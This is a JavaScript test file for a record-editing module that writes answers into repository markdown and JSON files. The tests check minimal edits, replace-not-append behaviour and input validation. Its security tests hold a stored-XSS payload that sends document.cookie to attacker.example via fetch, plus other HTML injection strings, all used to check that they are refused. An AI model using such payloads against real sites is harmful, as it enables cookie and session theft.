// Editing the text of a record, minimally.
//
// Decision 37: an answer submitted on a phone becomes a commit to `open-questions.md`, and the
// page reloaded afterwards is rendered from that file. So the file is the answer's only home, and
// what goes into it has to be something a person reading the repository on GitHub would have
// written by hand.
//
// The tests below hold two properties above all the others:
//
//   * **Nothing outside the block Atlas writes changes.** Not a heading, not a blank line, not a
//     trailing space. A generator that reformats the record it is answering is a generator that
//     makes every future diff unreadable, and the plan says so: do not reformat the surrounding
//     file.
//   * **Answering twice replaces, rather than accumulates.** The register is a record of what is
//     settled, not a transcript. Git already holds the transcript.

import test from 'node:test';
import assert from 'node:assert/strict';

import { RecordError, answerQuestion, answerRegisterQuestion, recordAcceptance, whyNotWritableText } from '../api/lib/records.mjs';

const REGISTER = [
  '# Open questions',
  '',
  'Nothing here is resolved silently.',
  '',
  '## Q1 · Does the cutover run per tenant or per environment?',
  '',
  'Raised while planning the second milestone.',
  '',
  '## Q2 · Who owns the fallback path?',
  '',
  'Nobody has said.',
  '',
].join('\n');

const AUTHOR = 'someone@example.com';

// Every line the edit did not add or remove, in order. The strongest available statement of
// "nothing else changed": it compares the two files with Atlas's own block taken out of both.
function withoutAtlasBlocks(text) {
  const lines = text.split('\n');
  const kept = [];
  let inside = false;
  for (const line of lines) {
    if (/^<!-- atlas:(answer|acceptance) -->$/.test(line.trim())) {
      inside = true;
      continue;
    }
    if (/^<!-- \/atlas:(answer|acceptance) -->$/.test(line.trim())) {
      inside = false;
      continue;
    }
    if (!inside) kept.push(line);
  }
  return kept;
}

// --- answering a question ------------------------------------------------------------------------

test('records: an answer lands inside the question it answers, and names who gave it', () => {
  const after = answerQuestion(REGISTER, { question: 'Q1', answer: 'Per tenant.', author: AUTHOR });

  const q1 = after.slice(after.indexOf('## Q1'), after.indexOf('## Q2'));
  assert.match(q1, /Per tenant\./);
  assert.match(q1, new RegExp(AUTHOR.replace('.', '\\.')));

  const q2 = after.slice(after.indexOf('## Q2'));
  assert.ok(!q2.includes('Per tenant.'), 'the answer landed in the wrong question');
});

test('records: nothing outside the answer block is touched — not one line', () => {
  const after = answerQuestion(REGISTER, { question: 'Q1', answer: 'Per tenant.', author: AUTHOR });
  // Every line of the original, in order, with only blank lines Atlas added around its own block
  // allowed to differ. Compare the two with the block removed and the blanks collapsed at the
  // seam.
  const before = withoutAtlasBlocks(REGISTER).filter((line) => line !== '');
  const now = withoutAtlasBlocks(after).filter((line) => line !== '');
  assert.deepEqual(now, before);
});

test('records: answering the same question again replaces the answer, never appends a second', () => {
  const once = answerQuestion(REGISTER, { question: 'Q1', answer: 'Per tenant.', author: AUTHOR });
  const twice = answerQuestion(once, { question: 'Q1', answer: 'Per environment, after all.', author: AUTHOR });

  assert.equal(twice.match(/atlas:answer/g).length, 2, 'a second answer block was added');
  assert.ok(!twice.includes('Per tenant.'), 'the superseded answer is still in the record');
  assert.match(twice, /Per environment, after all\./);
});

test('records: the last question in a file is answerable, with no heading after it to stop at', () => {
  const after = answerQuestion(REGISTER, { question: 'Q2', answer: 'The platform team.', author: AUTHOR });
  assert.match(after.slice(after.indexOf('## Q2')), /The platform team\./);
  assert.ok(after.endsWith('\n'), 'the record lost its trailing newline');
});

test('records: a question that is not in the register is refused, naming the register', () => {
  assert.throws(
    () => answerQuestion(REGISTER, { question: 'Q9', answer: 'x', author: AUTHOR, where: 'docs/features/a/open-questions.md' }),
    (error) => {
      assert.ok(error instanceof RecordError);
      assert.equal(error.code, 'no-such-question');
      assert.match(error.message, /Q9/);
      assert.match(error.message, /docs\/features\/a\/open-questions\.md/);
      return true;
    },
  );
});

test('records: two questions with one id are refused rather than one of them being picked', () => {
  // Decision 32's rule applied to a register: a duplicate is a record somebody has to fix, not a
  // coin toss about which one gets the answer.
  const ambiguous = `${REGISTER}\n## Q1 · Asked twice by mistake\n\nOops.\n`;
  assert.throws(
    () => answerQuestion(ambiguous, { question: 'Q1', answer: 'x', author: AUTHOR }),
    (error) => {
      assert.equal(error.code, 'ambiguous-question');
      assert.match(error.message, /Q1/);
      return true;
    },
  );
});

test('records: an id is matched whatever case it was typed in, and only as a whole token', () => {
  assert.match(answerQuestion(REGISTER, { question: 'q1', answer: 'Yes.', author: AUTHOR }), /Yes\./);
  // `Q1` must not match a heading that merely starts with those characters.
  const near = '# Open questions\n\n## Q12 · A different question\n\nBody.\n';
  assert.throws(() => answerQuestion(near, { question: 'Q1', answer: 'x', author: AUTHOR }), RecordError);
});

test('records: a register written with CRLF stays a CRLF file', () => {
  const crlf = REGISTER.split('\n').join('\r\n');
  const after = answerQuestion(crlf, { question: 'Q1', answer: 'Per tenant.', author: AUTHOR });
  assert.ok(after.includes('\r\n'), 'the line endings were rewritten');
  assert.ok(!/[^\r]\n/.test(after), 'the file now mixes line endings');
});

test('records: a multi-line answer stays multi-line, inside one block', () => {
  const after = answerQuestion(REGISTER, {
    question: 'Q1',
    answer: 'Per tenant.\n\nThe environment split was tried and abandoned.',
    author: AUTHOR,
  });
  assert.match(after, /The environment split was tried and abandoned\./);
  assert.equal(after.match(/atlas:answer/g).length, 2);
});

// --- what an answer may contain --------------------------------------------------------------

test('records: an answer that would become a heading is refused — it would split the register', () => {
  const why = whyNotWritableText('Per tenant.\n## Q3 · A question I invented');
  assert.notEqual(why, '');
  assert.match(why, /heading/i);
});

test('records: an answer cannot carry Atlas\'s own markers, in either direction', () => {
  assert.notEqual(whyNotWritableText('fine <!-- /atlas:answer --> not fine'), '');
  assert.notEqual(whyNotWritableText('<!-- atlas:acceptance -->'), '');
});

test('records: an empty answer is refused, because an empty answer answers nothing', () => {
  for (const empty of ['', '   ', '\n\n']) {
    assert.notEqual(whyNotWritableText(empty), '', `${JSON.stringify(empty)} was accepted`);
  }
});

test('records: an answer longer than a record should carry is refused by length, not truncated', () => {
  const why = whyNotWritableText('x'.repeat(8001));
  assert.notEqual(why, '');
  assert.match(why, /8000|too long/i);
  assert.equal(whyNotWritableText('x'.repeat(8000)), '');
});

test('records: a control character in an answer is refused, not written into the file', () => {
  assert.notEqual(whyNotWritableText(`bad${String.fromCharCode(0)}text`), '');
});

// --- acceptance ------------------------------------------------------------------------------

const ACCEPTANCE_RECORD = ['# M1 demo script', '', '1. Start the thing.', '2. Watch it work.', ''].join('\n');

test('acceptance: a result lands at the end of its own record, saying what and by whom', () => {
  const after = recordAcceptance(ACCEPTANCE_RECORD, { result: 'pass', author: AUTHOR });
  assert.match(after, /pass/);
  assert.match(after, new RegExp(AUTHOR.replace('.', '\\.')));
  assert.deepEqual(
    withoutAtlasBlocks(after).filter((l) => l !== ''),
    withoutAtlasBlocks(ACCEPTANCE_RECORD).filter((l) => l !== ''),
  );
});

test('acceptance: recording a result again replaces it — the record says what is true now', () => {
  const once = recordAcceptance(ACCEPTANCE_RECORD, { result: 'fail', author: AUTHOR });
  const twice = recordAcceptance(once, { result: 'pass', author: AUTHOR });
  assert.equal(twice.match(/atlas:acceptance/g).length, 2);
  assert.ok(!/\bfail\b/.test(twice), 'the superseded result is still in the record');
});

test('acceptance: a note is carried into the record, and is optional', () => {
  const withNote = recordAcceptance(ACCEPTANCE_RECORD, {
    result: 'fail',
    note: 'Step 2 timed out on the second run.',
    author: AUTHOR,
  });
  assert.match(withNote, /Step 2 timed out on the second run\./);

  const without = recordAcceptance(ACCEPTANCE_RECORD, { result: 'pass', author: AUTHOR });
  assert.ok(without.trim().endsWith('-->'), 'an empty note left a ragged block');
});

test('acceptance: nothing here reads the clock — the same input gives the same bytes twice', () => {
  // Decision 37 puts the answer in the repository and nowhere else, and git already records when
  // it arrived. A date written into the text would be a second, worse copy of that — and the one
  // thing in this repository that two runs of one input could disagree about.
  const first = recordAcceptance(ACCEPTANCE_RECORD, { result: 'pass', author: AUTHOR });
  const second = recordAcceptance(ACCEPTANCE_RECORD, { result: 'pass', author: AUTHOR });
  assert.equal(first, second);
  assert.ok(!/20\d\d-\d\d-\d\d/.test(first), 'a date reached the record');
});

// --- C1: what a write may put in front of a reader ------------------------------------------------

// The exact payload the security review posted through the real handler with a valid `author`
// principal, and got back out of the built site verbatim.
const XSS =
  '<img src=x onerror="alert(1)"><script>fetch("https://attacker.example/"+document.cookie)</script>';

test('records: an answer carrying HTML is refused — the corpus is rendered with html: true', () => {
  // `src/markdown.mjs` sets `html: true` on purpose (decision 11: the corpus's `<sub>` citations
  // must survive), and there is no CSP. Before this branch, putting bytes into a record needed
  // GitHub write access — people who could already do anything. M3 gives that to anyone holding
  // the Static Web Apps `author` role, which is a portal invitation and NOT GitHub access, so an
  // answer is untrusted input in a way a record has never been. The endpoint is the only place
  // that difference can be enforced.
  const why = whyNotWritableText(XSS);
  assert.notEqual(why, '', 'the stored-XSS payload was accepted into a record');
  assert.match(why, /HTML/i);
});

test('records: every tag-ish opening is refused, not just the ones with a script in them', () => {
  for (const payload of [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<iframe src="https://attacker.example"></iframe>',
    '<a href="#" onclick="alert(1)">click</a>',
    'fine so far </p><svg onload=alert(1)>',
    '<!-- a comment that is not one of ours -->',
    '<?php echo 1; ?>',
    // Decision 11's own vocabulary. An answer is typed into a form, not authored as a document,
    // so it loses inline HTML too — deliberately, because the alternative is an allow-list of
    // safe tags, and an allow-list of safe tags is a sanitiser to keep up to date forever.
    'a citation<sub>1</sub>',
  ]) {
    assert.notEqual(whyNotWritableText(payload), '', `${JSON.stringify(payload)} was accepted`);
  }
});

test('records: a less-than that is not a tag is still allowed — this is not a ban on the character', () => {
  for (const fine of ['3 < 4 and 5 > 4', 'a < b', 'x <= y', 'i < 10']) {
    assert.equal(whyNotWritableText(fine), '', `${JSON.stringify(fine)} was refused`);
  }
});

test('records: an entity-encoded tag is allowed, because it renders as text and not as a tag', () => {
  // markdown-it decodes an entity into text content, never into markup. Refusing this would be
  // refusing the one way to write about a tag in an answer.
  assert.equal(whyNotWritableText('use &lt;sub&gt; for citations'), '');
});

test('records: a setext heading is refused too — HEADING was ATX-only and === slipped past', () => {
  // The mutation table claimed heading injection was pinned. It was pinned for `#` and not for
  // the underlined forms, either of which renders as a heading inside somebody else's question.
  assert.notEqual(whyNotWritableText('Injected Heading\n================'), '');
  assert.notEqual(whyNotWritableText('Injected\n---'), '');
  assert.notEqual(whyNotWritableText('Injected\n==='), '');
});

test('records: an ordinary rule or a table is not a setext heading, and is still allowed', () => {
  // `---` with a blank line above it is a thematic break, and a table's delimiter row is full of
  // dashes. Refusing either would make the rule useless for the answers people actually write.
  assert.equal(whyNotWritableText('Per tenant.\n\n---\n\nAnd nothing else.'), '');
  assert.equal(whyNotWritableText('| a | b |\n| --- | --- |\n| 1 | 2 |'), '');
});

// --- I4: a stray closing marker must not swallow the record ---------------------------------------

test('records: a stray closing marker later in the file does not swallow what is between', () => {
  // `placeBlock` took the LAST closing marker in range rather than the first one after the open,
  // so a record that happens to contain a second `<!-- /atlas:acceptance -->` — pasted in, copied
  // from another record, left behind by a hand edit — lost everything between the two.
  const record = [
    '# M1 demo script',
    '',
    '1. Start the thing.',
    '',
    '<!-- atlas:acceptance -->',
    '**Acceptance: fail** — recorded by someone@example.com through Atlas.',
    '<!-- /atlas:acceptance -->',
    '',
    '## Important section',
    '',
    'Something that matters and must survive being re-accepted.',
    '',
    '<!-- /atlas:acceptance -->',
    '',
  ].join('\n');

  const after = recordAcceptance(record, { result: 'pass', author: AUTHOR });

  assert.match(after, /## Important section/, 'a whole section was silently deleted');
  assert.match(after, /Something that matters and must survive being re-accepted\./);
  assert.match(after, /Acceptance: pass/);
  assert.ok(!/Acceptance: fail/.test(after), 'the superseded result survived');
});

test('records: the same stray marker in a register does not swallow a later question', () => {
  const register = [
    '# Open questions',
    '',
    '## Q1 · A question',
    '',
    '<!-- atlas:answer -->',
    '**Answer** (someone@example.com):',
    '',
    'First answer.',
    '<!-- /atlas:answer -->',
    '',
    'A paragraph that belongs to Q1 and must survive.',
    '',
    '<!-- /atlas:answer -->',
    '',
    '## Q2 · Another question',
    '',
    'Untouched.',
    '',
  ].join('\n');

  const after = answerQuestion(register, { question: 'Q1', answer: 'Second answer.', author: AUTHOR });

  assert.match(after, /A paragraph that belongs to Q1 and must survive\./);
  assert.match(after, /## Q2 · Another question/);
  assert.match(after, /Second answer\./);
  assert.ok(!/First answer\./.test(after));
});

// --- M5: answerRegisterQuestion — the JSON-record counterpart of answerQuestion ------------------

function registerJson(overrides = {}) {
  return JSON.stringify({
    slug: 'lighthouse',
    title: 'T',
    questions: [
      {
        id: 'Q1', question: 'Q?', why: 'W', options: ['A', 'B'], recommended: 'A',
        severity: 'BLOCKING', chosen: { kind: 'deferred', value: null }, citations: [],
      },
    ],
    ...overrides,
  });
}

test('records: answerRegisterQuestion sets chosen on the named question, offered case', () => {
  const after = JSON.parse(
    answerRegisterQuestion(registerJson(), { questionId: 'Q1', chosen: 'A', chosenWasOffered: true, author: 'jeremy' }),
  );
  assert.deepEqual(after.questions[0].chosen, { kind: 'offered', value: 'A' });
});

test('records: answerRegisterQuestion marks a written-in answer distinctly', () => {
  const after = JSON.parse(
    answerRegisterQuestion(registerJson(), {
      questionId: 'Q1', chosen: 'Something else entirely', chosenWasOffered: false, author: 'jeremy',
    }),
  );
  assert.deepEqual(after.questions[0].chosen, { kind: 'written-in', value: 'Something else entirely' });
});

test('records: answerRegisterQuestion refuses an unknown question id', () => {
  assert.throws(
    () => answerRegisterQuestion(registerJson(), { questionId: 'Q99', chosen: 'A', chosenWasOffered: true, author: 'jeremy' }),
    (error) => error instanceof RecordError && error.code === 'no-such-question',
  );
});

test('records: answerRegisterQuestion refuses an offered answer that names no real option', () => {
  assert.throws(
    () => answerRegisterQuestion(registerJson(), { questionId: 'Q1', chosen: 'Option Z', chosenWasOffered: true, author: 'jeremy' }),
    (error) => error instanceof RecordError && error.code === 'invalid-payload',
  );
});

test('records: answering twice replaces, does not append', () => {
  const once = answerRegisterQuestion(registerJson(), { questionId: 'Q1', chosen: 'A', chosenWasOffered: true, author: 'jeremy' });
  const twice = JSON.parse(
    answerRegisterQuestion(once, { questionId: 'Q1', chosen: 'B', chosenWasOffered: true, author: 'jeremy' }),
  );
  assert.equal(twice.questions.length, 1);
  assert.deepEqual(twice.questions[0].chosen, { kind: 'offered', value: 'B' });
});

test("records: written-in text is guarded by the same whyNotWritableText the payload layer already applies", () => {
  // Not this function's own job — the SAME payload field (`answer`) both paths share is already
  // guarded at the payload-validation layer (api/lib/payload.mjs), before either path is ever
  // reached. This test asserts that guard function itself still refuses the same shapes it always
  // has, since M5 does not touch it.
  assert.ok(whyNotWritableText('<script>steal()</script>'));
  assert.ok(whyNotWritableText('A'.repeat(9000)));
  assert.ok(!whyNotWritableText('A perfectly ordinary written-in answer.'));
});

test('records: answerRegisterQuestion is case-insensitive on the question id, matching answerQuestion', () => {
  const after = JSON.parse(
    answerRegisterQuestion(registerJson(), { questionId: 'q1', chosen: 'A', chosenWasOffered: true, author: 'jeremy' }),
  );
  assert.deepEqual(after.questions[0].chosen, { kind: 'offered', value: 'A' });
});

test('records: answerRegisterQuestion refuses register text that is not valid JSON', () => {
  assert.throws(
    () => answerRegisterQuestion('not json at all', { questionId: 'Q1', chosen: 'A', chosenWasOffered: true, author: 'jeremy' }),
    (error) => error instanceof RecordError && error.code === 'invalid-payload',
  );
});
